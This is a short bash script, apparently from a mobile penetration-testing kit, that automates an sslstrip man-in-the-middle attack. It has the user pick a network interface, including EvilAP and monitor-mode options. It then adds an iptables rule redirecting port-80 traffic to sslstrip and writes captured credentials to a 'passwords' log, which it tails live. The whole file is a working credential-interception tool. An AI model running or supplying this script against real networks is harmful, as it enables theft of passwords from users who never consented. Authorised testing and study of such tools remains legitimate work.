#!/bin/bash
#SSLstripp script for sniffing on available interfaces

trap f_clean_up INT
trap f_clean_up KILL

##################################################
# Cleanup function to ensure sslstrip stops and iptable rules stop
f_clean_up(){
  echo
  echo "[!] Killing any instances of sslstrip and flushing iptables"
  echo
  killall sslstrip 
  # Remove SSL Strip itables rule ONLY
  iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8888
  #iptables --flush
  #iptables --table nat --flush
}

##################################################
f_interface(){
  clear
  echo "Select which interface you would like to sniff on? (1-6):"
  echo
  echo "1. eth0  (USB ethernet adapter)"
  echo "2. wlan0  (Internal Nexus Wifi)"
  echo "3. wlan1  (USB TPlink Atheros)"
  echo "4. mon0  (monitor mode interface)"
  echo "5. at0  (Use with EvilAP)"
  echo "6. rmnet_usb0 (Internal 3G GSM)"
  echo

  read -p "Choice: " interfacechoice

  case $interfacechoice in
    1) interface=eth0 ;;
    2) interface=wlan0 ;;
    3) interface=wlan1 ;;
    4) interface=mon0 ;;
    5) interface=at0 ;;
    6) interface=rmnet_usb0 ;;
    *) f_interface ;;
esac
}


#Setup IPtables for ssltrip
f_ip_tables(){
  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8888
}

f_run(){
  #Path to sslstrip definitions:
  clear
  echo
  echo  "Logging to /opt/pwnix/captures/passwords/"
  echo
  sleep 2

  f_interface
  f_ip_tables

  logfile=/opt/pwnix/captures/passwords/sslstrip_$(date +%F-%H%M).log

  sslstrip -pfk -w $logfile  -l 8888 $interface &

  sleep 3
  echo
  echo
  tail -f $logfile
}

f_run
f_clean_up
